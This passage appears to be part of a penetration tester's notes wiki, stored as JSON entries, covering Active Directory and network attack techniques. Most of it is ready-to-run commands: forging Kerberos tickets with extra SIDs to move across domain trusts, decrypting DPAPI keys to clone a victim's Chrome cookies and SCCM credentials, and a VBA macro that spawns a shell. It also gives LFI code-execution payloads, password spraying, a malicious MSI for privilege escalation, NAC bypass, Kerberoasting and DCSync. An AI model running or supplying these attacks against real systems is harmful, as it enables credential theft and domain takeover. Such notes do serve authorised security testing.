This relation allows a user from domaine A to access resources hosted in domain B.\nThe trusts relations can be : \n\nOne way\nTwo way\nTransitive\nUn-transitive\n\nOne way trust\nA One way trust is established from domain A to domain B. In this case, users from domain B can access resources based in domain A as domain A TRUST domain B.\nHowever, users from domain A cannot access resources based in domain B.\nTwo way\nIn this kind of trust, the domains trust each other. Thus, users from domain A can access resources based in domain B and the other way around.\nTransitive\nTransitive relation imply that if domain A trust domain B and domain C trust domain A, then domain C also trust domain B. With this configuration, users from domain B can access ressources inside domain C without an domain C explicitly trusting domain B.\nParent and Child\nBy default, when a child domain is created, a bidirectional trust between the parent and the child is created.\nThus, if the child domain is compromised and a Domain Admin account is retrieve, it is possible to compromise the parent domain too using the Domain Admin TGT with a SID History attribute. Indeed, jump from on domain to another is only allowed to Entreprise Admin users. Explicitly adding the user to the group is not needed, siimply adding the group SID to the SID History is enough.\nThere are several methods to add the Entreprise Admin SID into the user SID History such as patching the NTDS or through the DC Shadow technique but the easiest way is to forge the TGT with an extra SID. Rubeus support the /sids parameter that can be used to request a ticket with extra SID.\n\nGolden and Diamonds tickets can be created with Rubeus using the /sids parameter that will contains the Entreprise Admin group SID.\n\nGet TGT to another domain\nFirst, an inter-realm key is needed. Thus, the generation of the TGS must be performed in three steps.\n1 - Get TGT for the user\nRubeus.exe asktgt /user:${user} /domain:${startDomain} /aes256:${userKerberosKey} /nowrap\n\n2 - Get a referal ticket\nAsk a TGS signed with the trust account NTLM.\nRubeus.exe asktgs /service:krbtgt/${targetDomain} /domain:${startDomain} /dc:${dcStartDomain} /ticket:${userTGTFromStep1} /nowrap\n\n3 - Get TGS in the target domain\n\nThe serverFromTagerDomain and the targetDomain MUST be different servers !\nRubeus.exe asktgs /service:cifs/${serverFromTargetDomain} /domain:${targetDomain} /dc:${dcFromTargetDomain} /ticket:${ticketFromStep2} /nowrap\n\n\nShared Trust Password\nThis technique can be used when there is a one-way trust where Domain A trusts Domain B and Domain A has been compromised.\nAs the trust is a one-way trust, Domain A should not be able to access ressources from Domain B.\nBoth domains involved in a trust store a shared password that is renewed every 30 days in the Trust Domain Object (TDO).

This can be done by using the PowerShell Base64 module:\n[Convert]::ToBase64String([IO.File]::ReadAllBytes(${filename}))\n\nCheck that the key has been well exported by describing it:\ndpapi.py masterkey -file masterkey.bin\n\nThen, you can decrypt the masterkey using the DC backup key:\n# Mimikatz\ndpapi::masterkey /in:${masterKey} /pvk:${backupKey.pvk}\nClone Chrome Session\nThe Chrome session files are encrypted using the DPAPI. In fact, the cookies are encrypted using an AES key that is encrypted using the DPAPI.\nThe easiest way to clone a Chrome Session is to retrieve the C:\\Users\\${User}\\AppData\\Local\\Google\\Chrome\\User Data\\ folder. Clone this folder on your attack VM on the same folder.\nThen, decrypt the user DPAPI masterkey as explained before.\nFinally, you can use Mimikatz to generate the masterkey file on your computer:\ndpapi::create /guid:${masterKeyGUID} /key:${masterKeyValue} /password:${yourVMUserPassword} /protected\n# MasterKeyGUID: can be retrieved by describing the stolen masterkey\n# MasterKeyValue : the decrypted key retrieved\n# yourVMUserPassword : the password of the user you are using on your attack VM and not the password of the targeted user\n\nThis command will create a new hidden file named as the masterkey GUID. Check your directory with Get-ChildItem -Force.\nThen copy this masterkey in your masterkey directory:\nxcopy /H ${GUID} %AppData%\\Microsoft\\Protect\\${SID}\n\nThen launch Chrome. All the cookies should be loaded !\nSCCM NAA\nIf you retrieved the SCCM policy on a compromised machine, you can decrypt the NAA information offline.\nFirst, retrieve the SYSTEM DPAPI masterkey as explained before.\nCopy the NAA encrypted value with the following powershell:\n$str = \"060100000100000[...]6AC\"\n$bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}\n$b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])\n\nThen write it in a file:\necho ${base64} | base64 -d > secret.bin\nThen, decrypt the secret using Impacket:\ndpapi.py unprotect -file secret.bin -key ${systemMasterKey}\n\nResources\n\nSynacktiv\nSygnia\nFortra\n\n"},"Pentest/Techniques/Exploit handles.html":{"url":"Pentest/Techniques/Exploit handles.html","title":"Exploit handles","keywords":"","body":"Exploit handles\nTable of content\n\n\nHijack process to run arbitrary binary\n\n\nHijack process to run arbitrary binary\nThe idea is to retrieve the security token from a process launched by the targeted user.

By configuring your command in this registry key, it could be possible to bypass the restriction.\nShortcut\n\nCreate a new shortcut\nSet your script as a target (C:\\Windows\\System32\\cmd.exe /k \"whoami\")\nOpen the shortcut\n\nBatch file\nSometimes, the CMD is restricted but bat files can be run.\nThus, it is possible to emulate an interactive shell with the following bat script:\n@echo off\n:loop\nset /p var=command: \n%var%\ngoto loop\n\nThis bypass can be also used directly in the Windows RUN popup :\ncmd.exe /q /v:on /k \"FOR /L %N IN () DO (set /p var=command: && !var!)\"\nWord macro\nThe following VBA macro can be used to spawn a shell :\nSub Parent()\n\nSet objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objConfig = objStartup.SpawnInstance_\nSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\nerrReturn = objProcess.Create(\"C:\\Windows\\System32\\cmd.exe\", Null, objConfig, intProcessID)\n\nEnd Sub\n\nRunPE\nIf you have access to Office (WORD, EXCEL ...), it is possible to use process hollowing techniques to spawn a shell from a VBA macro: https://github.com/itm4n/VBA-RunPE\n"},"Pentest/Techniques/LFI.html":{"url":"Pentest/Techniques/LFI.html","title":"LFI","keywords":"","body":"LFI\nTable of content\n\n\nPhp wrappers\n\n\nPhp wrappers\n\nRead file that are not easily displayed\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n\nRemote code execution\nhttp://example.com/index.php?page=expect://id\n\n\n"},"Pentest/Techniques/Password spraying.html":{"url":"Pentest/Techniques/Password spraying.html","title":"Password Spraying","keywords":"","body":"Password spraying\nTable of content\n\n\nSharpHose\nResources\n\n\nSharpHose\n.\\SharpHose.exe --action SPRAY_USERS --spraypassword ${passwordToSpray} --domain ${domainName} --username ${domainUsername} --password ${domainPassword}\n\nResources\n\nGithub SharpHose : https://github.com/ustayready/SharpHose\n\n"},"Pentest/Techniques/Pivoting.html":{"url":"Pentest/Techniques/Pivoting.html","title":"Pivoting","keywords":"","body":"Pivoting\nTable of content\n\n\nSSH Socks5\nPort redirection\nNmap trough proxychains\n\n\nSSH Socks5\nssh -D ${port} -Nv ${user}@{ip}\n\nPort redirection\nsocat tcp-listen:8081,reuseaddr,fork tcp:127.0.0.1:8080\n\nNmap trough proxychains\n# Use `-oN --append-output ${file}` to save in file\nseq 1 65535 | xargs -P 50 -I port proxychains -q nmap ${ip} -p port -T4 -Pn | grep -F 'tcp/ open'\n\n"},"Pentest/Techniques/Privileges escalation/Windows.html":{"url":"Pentest/Techniques/Privileges escalation/Windows.html","title":"Windows","keywords":"","body":"Windows\nTable of content\n\n\nEnable a disabled privilege\nUnquoted services path\nAlways Install Enabled\nUAC-bypass (WIN10)\nChurrasco\nMS08-067\nWindows XP\nSP1\n\n\nRessources\nRessources\n\n\nEnable a disabled privilege\nAny disabled privilege can be re-enabled by the user.\nImport-Module ./PowerUp.ps1;

Then add your malicious executable. Then, click Finish.\nOnce the project is loaded, go to View > Custom Action, right click on Install and then Add Custom Action. Double click on Applicatioin Folder and select your malicious executable and click Ok.  Likewise, under Custom Action Runtime, select the appropriate plateform. It will ensure that your executable is launched when the MSI installer is run.\nThen install the MSI with the following command:\nmsiexec /q /n /i Installer.msi\n\nTo uninstalll the MSI once the exploit has be launched, run the following command:\nmsiexec /q /n /uninstall Installer.msi\n\n\nWhen this technique is used to launch a beacon, the beacon will block the Windows Installer.

This is the default configuration for switchs with IP phones connected.\nMulti-host: The first-connected device will open the switch port and all other devices can use the port without being authenticated. This mode is considered as unsecured and must not be used.\n\nEAP-TLS\nEAP is an authentication protocol. It is usually mixed with another protocol.\nThe authentication packets are sent by the EAP protocol, but the authentication data are encapsulated in the EAP packet using another protocol such as TLS.\nThe EAP-TLS authentication is based on the certificate. The user is authenticated using a TLS certificate stored on its machine.\nFor example, on companies, usually, the ADCS ADCS generates a certificate and a GPO push it in the machine certificate store.\nThus, when the machine is connected to the network, it can be authenticated on the switch using the certificate provided by the GPO.\nThe following figure exposes the authentication requests performed during the EAP-TLS flow:\n\nStandard network protection\nDHCP request close the switch port\nThe switch can be configured to close the port when a DHCP request is sent.\nThus, during the audit, it is recommended to deactivate the Windows network interface used cause it is hardly possible to avoid Windows to perform unwanted requests.\nMoreover, it is recommended to always use static IP.\nDHCP snooping\nThe DHCP snooping is a switch configuration that allows the switch to listen the DHCP traffic and drop potentially malicious requests\nAnti ARP spoofing\nThe name tell everything.\nThis protection mitigates ARP spoofing attacks.\nBypass NAC\nMAB\nMAC and IP usurpation\nThe easiest way to bypass MAB authentication is to spoof the MAC and the IP.\nHowever, some NAC solution implements a profiling mechanism.\nThis mechanism collects some data from the equipment that could not be known by an attacker such as its DHCP identifier, its Serial number, etc. and use them to determine the profile of the equipment.\nFor example, when an VoIP equipment initializes an authentication, its DHCP identifier is sent to the RADIUS. The RADIUS verify that the furnished DHCP identifier match with the MAC address filled in.\nIf it doesn't the authentication is refused.\nThus, this profiling method is a security through obscurity mechanism that allows to slightly increase the MAB authentication security.\nHold my beer !\nSome switches are misconfigured and do not close the port when the equipment is unplugged.\nThus, it is possible to unplug a legit equipment, spoof its MAC and IP and then connect it to the network.\nBecause the switch does not close the port, it will not ask for a reauthentication and the equipment will be allowed to access to the network.\nBecause the authenticate step has not been triggered, the RADIUS will not check for the new equipment profile.\nEAP-TLS\nBridged interfaces\nThe client must send a certificate to authenticate himself. Thus, an attacker spoofing its MAC will not be able to finalize the authentication process.\nThe idea of this attack is to let the equipment to authenticate itself on the switch through a controlled machine.\nBecause the NAC does not authenticate the equipment itself but the switch port, it will accept packets coming from the attacker machine.\nFor that, the attacker must be set in man in the middle position and forward all packets from the legit equipment to the NAC switch.\n\nPrerequis\n\nA Linux machine\nTwo networks interfaces\nA machine allowed to access to the network\n\nSteps\n\nInstall the bridge-utils package :sudo apt-get install bridge-utils -y\n\n\nBridge your two interfaces :brctl addbr br0       # create the bridge\nbrctl addif br0 eth1  # add eth1 to the bridge\nbrctl addif br0 eth2  # add eth2 to the bridge\n# activate all interfaces\nip l set eth1 up\nip l set eth2 up\nip l set br0 up\n\n\nConfigure the Linux kernel to forward EAP requests :echo 8 > /sys/class/net/br0/bridge/group_fwd_mask\n\n\nDeactivate the firewall :sudo ufw disable\nsudo iptables -I FORWARD -j ACCEPT\n`\n\n\nGive an IP to the br0 interface (static or DHCP)\nConnect the NAC switch and the legit equipement to your network adaptaters.\n\n It does not work \nThis technique can failed due to several protections.\nIf the DHCP is configured to only gave address to domain computer, the br0 interface will not be able to retrieve the address.\nSometimes, NAC switch can be configured to reauthenticate users when a DHCP request is sent.\nIf the NAC is configured with the Single-host mode, the br0 MAC address must spoof the legit equipment address.\nThe DHCP snooping and anti ARP spoofing can forbid use of static IP, thus, the it will not be possible to give IP to the br0 interface.\nMAC and IP NAT\nIn order to bypass restriction on IP attribution on the br0 interface it is possible to use NAT IP and NAT MAC. All the traffic can be natted to simulate it comes from the legit computer and not from the attacker machine.\nThe idea is, as previously, create a bridge between your the two network interfaces.\nThen, IPTABLES and EBTABLES are used to establish NAT rules:\nebtables -A POSTROUTING -s ${interfaceMAC} -o ${networkInterfaceName} -j snat --to-src ${legitEquipmentMAC} --snat-target ACCEPT\n\nebtables -A POSTROUTING -s br0 -o ${networkInterfaceName} -j snat --to-src ${legitEquipmentMAC} --snat-target ACCEPT\n\niptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p tcp -j SNAT --to-source ${legitEquipementIP}:61000-62000\n\niptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p udp -j SNAT --to-source ${legitEquipementIP}:61000-62000\n\niptables -A POSTROUTING -s 169.254.66.66/32 -o br0 -p icmp -j SNAT --to-source ${legitEquipementIP}\n\nThe following script will do the whole configuration :\n\nhttps://github.com/scipag/nac_bypass\n\nOnce the script finished, your computer is able to access to the network.\nRessources\n\nNAC bypass scripts : https://github.com/scipag/nac_bypass\n\n"},"Pentest/Technology/Port Knocking.html":{"url":"Pentest/Technology/Port Knocking.html","title":"Port Knocking","keywords":"","body":"Port Knocking\nTable of content\n\n\nDescription\nNmap\n\n\nDescription\nPort knocking is a security by obscurity technique that allows to open a port when some port are knocked in a defined order.\nFor example, the port 22 is filtered.

trusted Windows domain that IS NOT running Active Directory.\nUPLEVEL/WINDOWS_ACTIVE_DIRECTORY (0x00000002) : a trusted Windows domain that IS running Active Directory.\nMIT (0x00000003) : a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.\n\nTrustAttributes:\n\nNON_TRANSITIVE (0x00000001) : the trust cannot be used transitively. That is, if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A does not automatically trust Domain C. Also, if a trust is non-transitive, then you will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive.\nUPLEVEL_ONLY (0x00000002) : only Windows 2000 operating system and newer clients can use the trust.\nQUARANTINED_DOMAIN/FILTER_SID (0x00000004) : SID filtering is enabled.\nFOREST_TRANSITIVE (0x00000008) : cross-forest trust between the root of two domain forests running at least domain functional level 2003 or above.\nCROSS_ORGANIZATION (0x00000010) : the trust is to a domain or forest that is not part of the organization, which adds the OTHER_ORGANIZATION SID. This is a bit of a weird one. I don't remember encountering this flag in the field, but according to this post it means that the selective authentication security protection is enabled. For more information, check out this MSDN doc.\nWITHIN_FOREST (0x00000020) : the trusted domain is within the same forest, meaning a parent->child or cross-link relationship\nTREAT_AS_EXTERNAL (0x00000040) : the trust is to be treated as external for trust boundary purposes. According to the documentation, \"If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. Cross-forest trusts are more stringently filtered than external trusts. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.\" This sounds enticing, and I'm not 100% sure on the security implications of this statement.\nUSES_RC4_ENCRYPTION (0x00000080) : if the TrustType is MIT, specifies that the trust that supports RC4 keys.\nUSES_AES_KEYS (0x00000100) : not listed in the linked Microsoft documentation, but according to some documentation I've been able to find online, it specifies that AES keys are used to encrypt KRB TGTs.\nCROSS_ORGANIZATION_NO_TGT_DELEGATION (0x00000200) : \"If this bit is set, tickets granted under this trust MUST NOT be trusted for delegation.\" This is described more in MS-KILE 3.3.5.7.5 (Cross-Domain Trust and Referrals)\nPIM_TRUST (0x00000400) : \"If this bit and the TATE (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as Privileged Identity Management trust for the purposes of SID Filtering.\" According to MS-PAC 4.1.2.2 (SID Filtering and Claims Transformation), \"A domain can be externally managed by a domain that is outside the forest. The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.\" While I have not seen this in the field, and it's only supported by domain functional level 2012R2 and above, it also warrants further investigation\n\nGet information from a trusted domain\nDcIp is the IP is the IP of the initial domain controller\nGet-DomainUser -domain ${trustedDomain} -server ${dcIp}\n\nGet groups with user from other domains\nReturn the groups of the targetDomain that contain at least one user that is not from the targetDomain domain.\nThe SID returned cna be converted using the Convert-SID Powershell command.\nGet-DomainForeignGroupMember -Domain ${targetDomain}\n\nKerberoasting\nCollected hash need to be cracked\nInvoke-Kerberoast -domain ${domain} -server ${dcIp} -OutputFormat John| fl\n\n\nThe output format can be modify to format hash for John or Hashcat\n\nDCSync\nsecretsdump.py ${domain}/${user}@${dcIp} -just-dc-user ${adminUserToPwn}\n\nUnconstrained Delegation\nGet-DomainComputer -Unconstrained\n\nUsers that can modify GPO\nGet-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nIt will return the SID of the users that can modify the GPO.
